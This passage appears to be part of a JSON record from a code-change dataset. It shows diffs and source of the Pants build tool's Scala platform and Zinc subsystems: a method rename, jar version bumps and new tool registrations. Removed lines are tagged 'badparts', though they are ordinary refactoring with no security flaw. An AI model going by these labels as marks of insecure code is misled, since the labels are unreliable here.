cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),\n+      cls.register_jvm_tool(register, cls.versioned_tool_name(key, 'custom'),\n                             classpath=[dummy_jardep])\n     register_custom_tool('scalac')\n     register_custom_tool('scala-repl')\n", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["      cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),"], "goodparts": ["      cls.register_jvm_tool(register, cls.versioned_tool_name(key, 'custom'),"]}, {"diff": "\n   def _tool_classpath(self, tool, products):\n     \"\"\"Return the proper classpath based on products and scala version.\"\"\"\n     return self.tool_classpath_from_products(products,\n-                                             self._key_for_tool_version(tool, self.version),\n+                                             self.versioned_tool_name(tool, self.version),\n                                              scope=self.options_scope)\n \n   def compiler_classpath(self, products):\n", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["                                             self._key_for_tool_version(tool, self.version),"], "goodparts": ["                                             self.versioned_tool_name(tool, self.version),"]}, {"diff": "\n   @property\n   def repl(self):\n     \"\"\"Return the repl tool key.\"\"\"\n-    return self._key_for_tool_version('scala-repl', self.version)\n+    return self.versioned_tool_name('scala-repl', self.version)\n \n   def injectables(self, build_graph):\n     if self.version == 'custom'", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["    return self._key_for_tool_version('scala-repl', self.version)"], "goodparts": ["    return self.versioned_tool_name('scala-repl', self.version)"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals from collections import namedtuple from pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin from pants.backend.jvm.subsystems.zinc_language_mixin import ZincLanguageMixin from pants.backend.jvm.targets.jar_library import JarLibrary from pants.build_graph.address import Address from pants.build_graph.injectables_mixin import InjectablesMixin from pants.java.jar.jar_dependency import JarDependency from pants.subsystem.subsystem import Subsystem major_version_info=namedtuple('major_version_info',['full_version']) scala_build_info={ '2.10': major_version_info(full_version='2.10.6'), '2.11': major_version_info(full_version='2.11.12'), '2.12': major_version_info(full_version='2.12.4'), } scala_style_jar=JarDependency('org.scalastyle', 'scalastyle_2.11', '0.8.0') class ScalaPlatform(JvmToolMixin, ZincLanguageMixin, InjectablesMixin, Subsystem): \"\"\"A scala platform. :API: public \"\"\" options_scope='scala' @classmethod def _create_jardep(cls, name, version): return JarDependency(org='org.scala-lang', name=name, rev=scala_build_info[version].full_version) @classmethod def _create_runtime_jardep(cls, version): return cls._create_jardep('scala-library', version) @classmethod def _create_compiler_jardep(cls, version): return cls._create_jardep('scala-compiler', version) @classmethod def _key_for_tool_version(cls, tool, version): if version=='custom': return tool else: return '{}_{}'.format(tool, version.replace('.', '_')) @classmethod def register_options(cls, register): def register_scala_compiler_tool(version): cls.register_jvm_tool(register, cls._key_for_tool_version('scalac', version), classpath=[cls._create_compiler_jardep(version)]) def register_scala_repl_tool(version, with_jline=False): classpath=[cls._create_compiler_jardep(version)] if with_jline: jline_dep=JarDependency( org='org.scala-lang', name='jline', rev=scala_build_info[version].full_version ) classpath.append(jline_dep) cls.register_jvm_tool(register, cls._key_for_tool_version('scala-repl', version), classpath=classpath) def register_style_tool(version): cls.register_jvm_tool(register, cls._key_for_tool_version('scalastyle', version), classpath=[scala_style_jar]) super(ScalaPlatform, cls).register_options(register) register('--scalac-plugins', advanced=True, type=list, fingerprint=True, help='Use these scalac plugins.') register('--scalac-plugin-args', advanced=True, type=dict, default={}, fingerprint=True, help='Map from scalac plugin name to list of arguments for that plugin.') cls.register_jvm_tool(register, 'scalac-plugin-dep', classpath=[], help='Search for scalac plugins here, as well as in any ' 'explicit dependencies.') register('--version', advanced=True, default='2.12', choices=['2.10', '2.11', '2.12', 'custom'], fingerprint=True, help='The scala platform version. If --version=custom, the targets ' '//:scala-library, //:scalac, //:scala-repl and //:scalastyle will be used, ' 'and must exist. Otherwise, defaults for the specified version will be used.') register('--suffix-version', advanced=True, default=None, help='Scala suffix to be used in `scala_jar` definitions. For example, specifying ' '`2.11` or `2.12.0-RC1` would cause `scala_jar` lookups for artifacts with ' 'those suffixes.') register_scala_compiler_tool('2.10') register_scala_repl_tool('2.10', with_jline=True) register_style_tool('2.10') register_scala_compiler_tool('2.11') register_scala_repl_tool('2.11') register_style_tool('2.11') register_scala_compiler_tool('2.12') register_scala_repl_tool('2.12') register_style_tool('2.12') def register_custom_tool(key): dummy_jardep=JarDependency('missing spec', ' //:{}'.format(key)) cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'), classpath=[dummy_jardep]) register_custom_tool('scalac') register_custom_tool('scala-repl') register_custom_tool('scalastyle') def _tool_classpath(self, tool, products): \"\"\"Return the proper classpath based on products and scala version.\"\"\" return self.tool_classpath_from_products(products, self._key_for_tool_version(tool, self.version), scope=self.options_scope) def compiler_classpath(self, products): return self._tool_classpath('scalac', products) def style_classpath(self, products): return self._tool_classpath('scalastyle', products) @property def version(self): return self.get_options().version def suffix_version(self, name): \"\"\"Appends the platform version to the given artifact name. Also validates that the name doesn't already end with the version. \"\"\" if self.version=='custom': suffix=self.get_options().suffix_version if suffix: return '{0}_{1}'.format(name, suffix) else: raise RuntimeError('Suffix version must be specified if using a custom scala version. ' 'Suffix version is used for bootstrapping jars. If a custom ' 'scala version is not specified, then the version specified in ' '--scala-suffix-version is used. For example for Scala ' '2.10.7 you would use the suffix version \"2.10\".') elif name.endswith(self.version): raise ValueError('The name \"{0}\" should not be suffixed with the scala platform version ' '({1}): it will be added automatically.'.format(name, self.version)) return '{0}_{1}'.format(name, self.version) @property def repl(self): \"\"\"Return the repl tool key.\"\"\" return self._key_for_tool_version('scala-repl', self.version) def injectables(self, build_graph): if self.version=='custom': return specs_to_create=[ ('scalac', self._create_compiler_jardep), ('scala-library', self._create_runtime_jardep) ] for spec_key, create_jardep_func in specs_to_create: spec=self.injectables_spec_for_key(spec_key) target_address=Address.parse(spec) if not build_graph.contains_address(target_address): jars=[create_jardep_func(self.version)] build_graph.inject_synthetic_target(target_address, JarLibrary, jars=jars, scope='forced') elif not build_graph.get_target(target_address).is_synthetic: raise build_graph.ManualSyntheticTargetError(target_address) @property def injectables_spec_mapping(self): maybe_suffix='' if self.version=='custom' else '-synthetic' return{ 'scalac':['//:scalac{}'.format(maybe_suffix)], 'scala-library':['//:scala-library{}'.format(maybe_suffix)] } ", "sourceWithComments": "# coding=utf-8\n# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nfrom collections import namedtuple\n\nfrom pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin\nfrom pants.backend.jvm.subsystems.zinc_language_mixin import ZincLanguageMixin\nfrom pants.backend.jvm.targets.jar_library import JarLibrary\nfrom pants.build_graph.address import Address\nfrom pants.build_graph.injectables_mixin import InjectablesMixin\nfrom pants.java.jar.jar_dependency import JarDependency\nfrom pants.subsystem.subsystem import Subsystem\n\n\n# full_version - the full scala version to use.\nmajor_version_info = namedtuple('major_version_info', ['full_version'])\n\n\n# Note that the compiler has two roles here: as a tool (invoked by the compile task), and as a\n# runtime library (when compiling plugins, which require the compiler library as a dependency).\nscala_build_info = {\n  '2.10': major_version_info(full_version='2.10.6'),\n  '2.11': major_version_info(full_version='2.11.12'),\n  '2.12': major_version_info(full_version='2.12.4'),\n}\n\n\n# Because scalastyle inspects only the sources, it needn't match the platform version.\nscala_style_jar = JarDependency('org.scalastyle', 'scalastyle_2.11', '0.8.0')\n\n\n# TODO: Sort out JVM compile config model: https://github.com/pantsbuild/pants/issues/4483.\nclass ScalaPlatform(JvmToolMixin, ZincLanguageMixin, InjectablesMixin, Subsystem):\n  \"\"\"A scala platform.\n\n  :API: public\n  \"\"\"\n  options_scope = 'scala'\n\n  @classmethod\n  def _create_jardep(cls, name, version):\n    return JarDependency(org='org.scala-lang',\n                         name=name,\n                         rev=scala_build_info[version].full_version)\n\n  @classmethod\n  def _create_runtime_jardep(cls, version):\n    return cls._create_jardep('scala-library', version)\n\n  @classmethod\n  def _create_compiler_jardep(cls, version):\n    return cls._create_jardep('scala-compiler', version)\n\n  @classmethod\n  def _key_for_tool_version(cls, tool, version):\n    if version == 'custom':\n      return tool\n    else:\n      return '{}_{}'.format(tool, version.replace('.', '_'))\n\n  @classmethod\n  def register_options(cls, register):\n    def register_scala_compiler_tool(version):\n      cls.register_jvm_tool(register,\n                            cls._key_for_tool_version('scalac', version),\n                            classpath=[cls._create_compiler_jardep(version)])\n\n    def register_scala_repl_tool(version, with_jline=False):\n      classpath = [cls._create_compiler_jardep(version)]  # Note: the REPL is in the compiler jar.\n      if with_jline:\n        jline_dep = JarDependency(\n            org = 'org.scala-lang',\n            name = 'jline',\n            rev = scala_build_info[version].full_version\n        )\n        classpath.append(jline_dep)\n      cls.register_jvm_tool(register,\n                            cls._key_for_tool_version('scala-repl', version),\n                            classpath=classpath)\n\n    def register_style_tool(version):\n      cls.register_jvm_tool(register,\n                            cls._key_for_tool_version('scalastyle', version),\n                            classpath=[scala_style_jar])\n\n    super(ScalaPlatform, cls).register_options(register)\n\n    register('--scalac-plugins', advanced=True, type=list, fingerprint=True,\n            help='Use these scalac plugins.')\n    register('--scalac-plugin-args', advanced=True, type=dict, default={}, fingerprint=True,\n            help='Map from scalac plugin name to list of arguments for that plugin.')\n    cls.register_jvm_tool(register, 'scalac-plugin-dep', classpath=[],\n                        help='Search for scalac plugins here, as well as in any '\n                                'explicit dependencies.')\n\n    register('--version', advanced=True, default='2.12',\n             choices=['2.10', '2.11', '2.12', 'custom'], fingerprint=True,\n             help='The scala platform version. If --version=custom, the targets '\n                  '//:scala-library, //:scalac, //:scala-repl and //:scalastyle will be used, '\n                  'and must exist.  Otherwise, defaults for the specified version will be used.')\n\n    register('--suffix-version', advanced=True, default=None,\n             help='Scala suffix to be used in `scala_jar` definitions. For example, specifying '\n                  '`2.11` or `2.12.0-RC1` would cause `scala_jar` lookups for artifacts with '\n                  'those suffixes.')\n\n    # Register the fixed version tools.\n    register_scala_compiler_tool('2.10')\n    register_scala_repl_tool('2.10', with_jline=True)  # 2.10 repl requires jline.\n    register_style_tool('2.10')\n\n    register_scala_compiler_tool('2.11')\n    register_scala_repl_tool('2.11')\n    register_style_tool('2.11')\n\n    register_scala_compiler_tool('2.12')\n    register_scala_repl_tool('2.12')\n    register_style_tool('2.12')\n\n    # Register the custom tools. We provide a dummy classpath, so that register_jvm_tool won't\n    # require that a target with the given spec actually exist (not everyone will define custom\n    # scala platforms). However if the custom tool is actually resolved, we want that to\n    # fail with a useful error, hence the dummy jardep with rev=None.\n    def register_custom_tool(key):\n      dummy_jardep = JarDependency('missing spec', ' //:{}'.format(key))\n      cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),\n                            classpath=[dummy_jardep])\n    register_custom_tool('scalac')\n    register_custom_tool('scala-repl')\n    register_custom_tool('scalastyle')\n\n  def _tool_classpath(self, tool, products):\n    \"\"\"Return the proper classpath based on products and scala version.\"\"\"\n    return self.tool_classpath_from_products(products,\n                                             self._key_for_tool_version(tool, self.version),\n                                             scope=self.options_scope)\n\n  def compiler_classpath(self, products):\n    return self._tool_classpath('scalac', products)\n\n  def style_classpath(self, products):\n    return self._tool_classpath('scalastyle', products)\n\n  @property\n  def version(self):\n    return self.get_options().version\n\n  def suffix_version(self, name):\n    \"\"\"Appends the platform version to the given artifact name.\n\n    Also validates that the name doesn't already end with the version.\n    \"\"\"\n    if self.version == 'custom':\n      suffix = self.get_options().suffix_version\n      if suffix:\n        return '{0}_{1}'.format(name, suffix)\n      else:\n        raise RuntimeError('Suffix version must be specified if using a custom scala version. '\n                           'Suffix version is used for bootstrapping jars.  If a custom '\n                           'scala version is not specified, then the version specified in '\n                           '--scala-suffix-version is used.  For example for Scala '\n                           '2.10.7 you would use the suffix version \"2.10\".')\n\n    elif name.endswith(self.version):\n      raise ValueError('The name \"{0}\" should not be suffixed with the scala platform version '\n                      '({1}): it will be added automatically.'.format(name, self.version))\n    return '{0}_{1}'.format(name, self.version)\n\n  @property\n  def repl(self):\n    \"\"\"Return the repl tool key.\"\"\"\n    return self._key_for_tool_version('scala-repl', self.version)\n\n  def injectables(self, build_graph):\n    if self.version == 'custom':\n      return\n\n    specs_to_create = [\n      ('scalac', self._create_compiler_jardep),\n      ('scala-library', self._create_runtime_jardep)\n    ]\n\n    for spec_key, create_jardep_func in specs_to_create:\n      spec = self.injectables_spec_for_key(spec_key)\n      target_address = Address.parse(spec)\n      if not build_graph.contains_address(target_address):\n        jars = [create_jardep_func(self.version)]\n        build_graph.inject_synthetic_target(target_address,\n                                           JarLibrary,\n                                           jars=jars,\n                                           scope='forced')\n      elif not build_graph.get_target(target_address).is_synthetic:\n        raise build_graph.ManualSyntheticTargetError(target_address)\n\n  @property\n  def injectables_spec_mapping(self):\n    maybe_suffix = '' if self.version == 'custom' else '-synthetic'\n    return {\n      # Target spec for the scala compiler library.\n      'scalac': ['//:scalac{}'.format(maybe_suffix)],\n      # Target spec for the scala runtime library.\n      'scala-library': ['//:scala-library{}'.format(maybe_suffix)]\n    }\n"}, "/src/python/pants/backend/jvm/subsystems/zinc.py": {"changes": [{"diff": "\n from pants.backend.jvm.tasks.classpath_util import ClasspathUtil\n from pants.base.build_environment import get_buildroot\n-from pants.engine.fs import PathGlobs, PathGlobsAndRoot\n+from pants.base.workunit import WorkUnitLabel\n+from pants.engine.fs import DirectoryToMaterialize, PathGlobs, PathGlobsAndRoot\n+from pants.engine.isolated_process import ExecuteProcessRequest\n from pants.java.jar.jar_dependency import JarDependency\n from pants.subsystem.subsystem import Subsystem\n-from pants.util.dirutil import fast_relpath\n+from pants.util.dirutil import fast_relpath, safe_mkdir\n+from pants.util.fileutil import safe_hardlink_or_copy\n from pants.util.memo import memoized_method, memoized_property\n \n \n", "add": 5, "remove": 2, "filename": "/src/python/pants/backend/jvm/subsystems/zinc.py", "badparts": ["from pants.engine.fs import PathGlobs, PathGlobsAndRoot", "from pants.util.dirutil import fast_relpath"], "goodparts": ["from pants.base.workunit import WorkUnitLabel", "from pants.engine.fs import DirectoryToMaterialize, PathGlobs, PathGlobsAndRoot", "from pants.engine.isolated_process import ExecuteProcessRequest", "from pants.util.dirutil import fast_relpath, safe_mkdir", "from pants.util.fileutil import safe_hardlink_or_copy"]}, {"diff": "\n           Shader.exclude_package('org.apache.logging.log4j', recursive=True),\n         ]\n \n+      cls.register_jvm_tool(register,\n+                            Zinc.ZINC_BOOTSTRAPPER_TOOL_NAME,\n+                            classpath=[\n+                              JarDependency('org.pantsbuild', 'zinc-bootstrapper_2.11', '0.0.3'),\n+                            ],\n+                            main=Zinc.ZINC_BOOTSTRAPER_MAIN,\n+                            custom_rules=shader_rules,\n+                          )\n+\n       cls.register_jvm_tool(register,\n                             Zinc.ZINC_COMPILER_TOOL_NAME,\n                             classpath=[\n-                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),\n+                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.8'),\n                             ],\n                             main=Zinc.ZINC_COMPILE_MAIN,\n                             custom_rules=shader_rules)\n", "add": 10, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/zinc.py", "badparts": ["                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),"], "goodparts": ["      cls.register_jvm_tool(register,", "                            Zinc.ZINC_BOOTSTRAPPER_TOOL_NAME,", "                            classpath=[", "                              JarDependency('org.pantsbuild', 'zinc-bootstrapper_2.11', '0.0.3'),", "                            ],", "                            main=Zinc.ZINC_BOOTSTRAPER_MAIN,", "                            custom_rules=shader_rules,", "                          )", "                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.8'),"]}, {"diff": "\n       cls.register_jvm_tool(register,\n                             Zinc.ZINC_EXTRACTOR_TOOL_NAME,\n                             classpath=[\n-                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')\n+                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.6')\n                             ])\n \n+      # Register scalac for fixed versions of Scala, 2.10, 2.11 and 2.12.\n+      # Relies on ScalaPlatform to get the revision version from the major.minor version.\n+      # The tool with the correct scala version will be retrieved later,\n+      # taking the user-passed option into account.\n+      supported_scala_versions=['2.10', '2.11', '2.12']\n+      wanted_jars = ['scala-compiler', 'scala-library', 'scala-reflect']\n+      for scala_version in supported_scala_versions:\n+        cls.register_jvm_tool(register,\n+                              ScalaPlatform.versioned_tool_name('scalac', scala_version),\n+                              classpath=[\n+                                ScalaPlatform.create_jardep(jar, scala_version) for jar in wanted_jars\n+                              ])\n+\n+      # Register custom scalac tool.\n+      cls.register_jvm_tool(register,\n+                            ScalaPlatform.versioned_tool_name('scalac', 'custom'),\n+                            classpath=[JarDependency('missing spec', ' //:scalac')])\n+\n     @classmethod\n     def _zinc(cls, products):\n       return cls.tool_jar_from_products(products, Zinc.ZINC_COMPILER_TOOL_NAME, cls.options_scope)\n", "add": 19, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/zinc.py", "badparts": ["                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')"], "goodparts": ["                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.6')", "      supported_scala_versions=['2.10', '2.11', '2.12']", "      wanted_jars = ['scala-compiler', 'scala-library', 'scala-reflect']", "      for scala_version in supported_scala_versions:", "        cls.register_jvm_tool(register,", "                              ScalaPlatform.versioned_tool_name('scalac', scala_version),", "                              classpath=[", "                                ScalaPlatform.create_jardep(jar, scala_version) for jar in wanted_jars", "                              ])", "      cls.register_jvm_tool(register,", "                            ScalaPlatform.versioned_tool_name('scalac', 'custom'),", "                            classpath=[JarDependency('missing spec', ' //:scalac')])"]}, {"diff": "\n         PathGlobs(\n           tuple(\n             fast_relpath(a, buildroot)\n-            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)\n+              for a in (self.zinc, self.compiler_bridge, self.compiler_interface)\n           )\n         ),\n         buildroot,\n", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/zinc.py", "badparts": ["            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)"], "goodparts": ["              for a in (self.zinc, self.compiler_bridge, self.compiler_interface)"]}, {"diff": "\n     \"\"\"Compute the compile classpath for the given target.\"\"\"\n     return list(\n       entry.path\n-      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)\n+        for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)\n    ", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/zinc.py", "badparts": ["      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)"], "goodparts": ["        for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals from builtins import object from pants.backend.jvm.subsystems.dependency_context import DependencyContext from pants.backend.jvm.subsystems.java import Java from pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin from pants.backend.jvm.subsystems.scala_platform import ScalaPlatform from pants.backend.jvm.subsystems.shader import Shader from pants.backend.jvm.targets.scala_jar_dependency import ScalaJarDependency from pants.backend.jvm.tasks.classpath_products import ClasspathEntry from pants.backend.jvm.tasks.classpath_util import ClasspathUtil from pants.base.build_environment import get_buildroot from pants.engine.fs import PathGlobs, PathGlobsAndRoot from pants.java.jar.jar_dependency import JarDependency from pants.subsystem.subsystem import Subsystem from pants.util.dirutil import fast_relpath from pants.util.memo import memoized_method, memoized_property class Zinc(object): \"\"\"Configuration for Pants' zinc wrapper tool.\"\"\" ZINC_COMPILE_MAIN='org.pantsbuild.zinc.compiler.Main' ZINC_EXTRACT_MAIN='org.pantsbuild.zinc.extractor.Main' DEFAULT_CONFS=['default'] ZINC_COMPILER_TOOL_NAME='zinc' ZINC_EXTRACTOR_TOOL_NAME='zinc-extractor' class Factory(Subsystem, JvmToolMixin): options_scope='zinc' @classmethod def subsystem_dependencies(cls): return super(Zinc.Factory, cls).subsystem_dependencies() +(DependencyContext, Java, ScalaPlatform) @classmethod def register_options(cls, register): super(Zinc.Factory, cls).register_options(register) zinc_rev='1.0.3' shader_rules=[ Shader.exclude_package('scala', recursive=True), Shader.exclude_package('xsbt', recursive=True), Shader.exclude_package('xsbti', recursive=True), Shader.exclude_package('org.apache.logging.log4j', recursive=True), ] cls.register_jvm_tool(register, Zinc.ZINC_COMPILER_TOOL_NAME, classpath=[ JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'), ], main=Zinc.ZINC_COMPILE_MAIN, custom_rules=shader_rules) cls.register_jvm_tool(register, 'compiler-bridge', classpath=[ ScalaJarDependency(org='org.scala-sbt', name='compiler-bridge', rev=zinc_rev, classifier='sources', intransitive=True), ]) cls.register_jvm_tool(register, 'compiler-interface', classpath=[ JarDependency(org='org.scala-sbt', name='compiler-interface', rev=zinc_rev), ], main='no.such.main.Main', custom_rules=shader_rules) cls.register_jvm_tool(register, Zinc.ZINC_EXTRACTOR_TOOL_NAME, classpath=[ JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4') ]) @classmethod def _zinc(cls, products): return cls.tool_jar_from_products(products, Zinc.ZINC_COMPILER_TOOL_NAME, cls.options_scope) @classmethod def _compiler_bridge(cls, products): return cls.tool_jar_from_products(products, 'compiler-bridge', cls.options_scope) @classmethod def _compiler_interface(cls, products): return cls.tool_jar_from_products(products, 'compiler-interface', cls.options_scope) def create(self, products): \"\"\"Create a Zinc instance from products active in the current Pants run. :param products: The active Pants run products to pluck classpaths from. :type products::class:`pants.goal.products.Products` :returns: A Zinc instance with access to relevant Zinc compiler wrapper jars and classpaths. :rtype::class:`Zinc` \"\"\" return Zinc(self, products) def __init__(self, zinc_factory, products): self._zinc_factory=zinc_factory self._products=products @memoized_property def zinc(self): \"\"\"Return the Zinc wrapper compiler classpath. :rtype: list of str \"\"\" return self._zinc_factory._zinc(self._products) @property def dist(self): \"\"\"Return the distribution selected for Zinc. :rtype: list of str \"\"\" return self._zinc_factory.dist @memoized_property def compiler_bridge(self): \"\"\"Return the path to the Zinc compiler-bridge jar. :rtype: str \"\"\" return self._zinc_factory._compiler_bridge(self._products) @memoized_property def compiler_interface(self): \"\"\"Return the path to the Zinc compiler-interface jar. :rtype: str \"\"\" return self._zinc_factory._compiler_interface(self._products) @memoized_method def snapshot(self, scheduler): buildroot=get_buildroot() return scheduler.capture_snapshots(( PathGlobsAndRoot( PathGlobs( tuple( fast_relpath(a, buildroot) for a in(self.zinc, self.compiler_bridge, self.compiler_interface) ) ), buildroot, ), ))[0] @memoized_property def rebase_map_args(self): \"\"\"We rebase known stable paths in zinc analysis to make it portable across machines.\"\"\" rebases={ self.dist.real_home: '/dev/null/remapped_by_pants/java_home/', get_buildroot(): '/dev/null/remapped_by_pants/buildroot/', self._zinc_factory.get_options().pants_workdir: '/dev/null/remapped_by_pants/workdir/', } return( '-rebase-map', ','.join('{}:{}'.format(src, dst) for src, dst in rebases.items()) ) @memoized_method def _compiler_plugins_cp_entries(self): \"\"\"Any additional global compiletime classpath entries for compiler plugins.\"\"\" java_options_src=Java.global_instance() scala_options_src=ScalaPlatform.global_instance() def cp(instance, toolname): scope=instance.options_scope return instance.tool_classpath_from_products(self._products, toolname, scope=scope) classpaths=(cp(java_options_src, 'javac-plugin-dep') + cp(scala_options_src, 'scalac-plugin-dep')) return[(conf, ClasspathEntry(jar)) for conf in self.DEFAULT_CONFS for jar in classpaths] @memoized_property def extractor(self): return self._zinc_factory.tool_classpath_from_products(self._products, self.ZINC_EXTRACTOR_TOOL_NAME, scope=self._zinc_factory.options_scope) def compile_classpath_entries(self, classpath_product_key, target, extra_cp_entries=None): classpath_product=self._products.get_data(classpath_product_key) if DependencyContext.global_instance().defaulted_property(target, lambda x: x.strict_deps): dependencies=target.strict_dependencies(DependencyContext.global_instance()) else: dependencies=DependencyContext.global_instance().all_dependencies(target) all_extra_cp_entries=list(self._compiler_plugins_cp_entries()) if extra_cp_entries: all_extra_cp_entries.extend(extra_cp_entries) return ClasspathUtil.compute_classpath_entries(iter(dependencies), classpath_product, all_extra_cp_entries, self.DEFAULT_CONFS, ) def compile_classpath(self, classpath_product_key, target, extra_cp_entries=None): \"\"\"Compute the compile classpath for the given target.\"\"\" return list( entry.path for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries) ) ", "sourceWithComments": "# coding=utf-8\n# Copyright 2017 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nfrom builtins import object\n\nfrom pants.backend.jvm.subsystems.dependency_context import DependencyContext\nfrom pants.backend.jvm.subsystems.java import Java\nfrom pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin\nfrom pants.backend.jvm.subsystems.scala_platform import ScalaPlatform\nfrom pants.backend.jvm.subsystems.shader import Shader\nfrom pants.backend.jvm.targets.scala_jar_dependency import ScalaJarDependency\nfrom pants.backend.jvm.tasks.classpath_products import ClasspathEntry\nfrom pants.backend.jvm.tasks.classpath_util import ClasspathUtil\nfrom pants.base.build_environment import get_buildroot\nfrom pants.engine.fs import PathGlobs, PathGlobsAndRoot\nfrom pants.java.jar.jar_dependency import JarDependency\nfrom pants.subsystem.subsystem import Subsystem\nfrom pants.util.dirutil import fast_relpath\nfrom pants.util.memo import memoized_method, memoized_property\n\n\nclass Zinc(object):\n  \"\"\"Configuration for Pants' zinc wrapper tool.\"\"\"\n\n  ZINC_COMPILE_MAIN = 'org.pantsbuild.zinc.compiler.Main'\n  ZINC_EXTRACT_MAIN = 'org.pantsbuild.zinc.extractor.Main'\n  DEFAULT_CONFS = ['default']\n\n  ZINC_COMPILER_TOOL_NAME = 'zinc'\n  ZINC_EXTRACTOR_TOOL_NAME = 'zinc-extractor'\n\n  class Factory(Subsystem, JvmToolMixin):\n    options_scope = 'zinc'\n\n    @classmethod\n    def subsystem_dependencies(cls):\n      return super(Zinc.Factory, cls).subsystem_dependencies() + (DependencyContext,\n                                                                  Java,\n                                                                  ScalaPlatform)\n\n    @classmethod\n    def register_options(cls, register):\n      super(Zinc.Factory, cls).register_options(register)\n\n      zinc_rev = '1.0.3'\n\n      shader_rules = [\n          # The compiler-interface and compiler-bridge tool jars carry xsbt and\n          # xsbti interfaces that are used across the shaded tool jar boundary so\n          # we preserve these root packages wholesale along with the core scala\n          # APIs.\n          Shader.exclude_package('scala', recursive=True),\n          Shader.exclude_package('xsbt', recursive=True),\n          Shader.exclude_package('xsbti', recursive=True),\n          # Unfortunately, is loaded reflectively by the compiler.\n          Shader.exclude_package('org.apache.logging.log4j', recursive=True),\n        ]\n\n      cls.register_jvm_tool(register,\n                            Zinc.ZINC_COMPILER_TOOL_NAME,\n                            classpath=[\n                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),\n                            ],\n                            main=Zinc.ZINC_COMPILE_MAIN,\n                            custom_rules=shader_rules)\n\n      cls.register_jvm_tool(register,\n                            'compiler-bridge',\n                            classpath=[\n                              ScalaJarDependency(org='org.scala-sbt',\n                                                name='compiler-bridge',\n                                                rev=zinc_rev,\n                                                classifier='sources',\n                                                intransitive=True),\n                            ])\n      cls.register_jvm_tool(register,\n                            'compiler-interface',\n                            classpath=[\n                              JarDependency(org='org.scala-sbt',\n                                            name='compiler-interface',\n                                            rev=zinc_rev),\n                            ],\n                            # NB: We force a noop-jarjar'ing of the interface, since it is now\n                            # broken up into multiple jars, but zinc does not yet support a sequence\n                            # of jars for the interface.\n                            main='no.such.main.Main',\n                            custom_rules=shader_rules)\n\n      cls.register_jvm_tool(register,\n                            Zinc.ZINC_EXTRACTOR_TOOL_NAME,\n                            classpath=[\n                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')\n                            ])\n\n    @classmethod\n    def _zinc(cls, products):\n      return cls.tool_jar_from_products(products, Zinc.ZINC_COMPILER_TOOL_NAME, cls.options_scope)\n\n    @classmethod\n    def _compiler_bridge(cls, products):\n      return cls.tool_jar_from_products(products, 'compiler-bridge', cls.options_scope)\n\n    @classmethod\n    def _compiler_interface(cls, products):\n      return cls.tool_jar_from_products(products, 'compiler-interface', cls.options_scope)\n\n    def create(self, products):\n      \"\"\"Create a Zinc instance from products active in the current Pants run.\n\n      :param products: The active Pants run products to pluck classpaths from.\n      :type products: :class:`pants.goal.products.Products`\n      :returns: A Zinc instance with access to relevant Zinc compiler wrapper jars and classpaths.\n      :rtype: :class:`Zinc`\n      \"\"\"\n      return Zinc(self, products)\n\n  def __init__(self, zinc_factory, products):\n    self._zinc_factory = zinc_factory\n    self._products = products\n\n  @memoized_property\n  def zinc(self):\n    \"\"\"Return the Zinc wrapper compiler classpath.\n\n    :rtype: list of str\n    \"\"\"\n    return self._zinc_factory._zinc(self._products)\n\n  @property\n  def dist(self):\n    \"\"\"Return the distribution selected for Zinc.\n\n    :rtype: list of str\n    \"\"\"\n    return self._zinc_factory.dist\n\n  @memoized_property\n  def compiler_bridge(self):\n    \"\"\"Return the path to the Zinc compiler-bridge jar.\n\n    :rtype: str\n    \"\"\"\n    return self._zinc_factory._compiler_bridge(self._products)\n\n  @memoized_property\n  def compiler_interface(self):\n    \"\"\"Return the path to the Zinc compiler-interface jar.\n\n    :rtype: str\n    \"\"\"\n    return self._zinc_factory._compiler_interface(self._products)\n\n  @memoized_method\n  def snapshot(self, scheduler):\n    buildroot = get_buildroot()\n    return scheduler.capture_snapshots((\n      PathGlobsAndRoot(\n        PathGlobs(\n          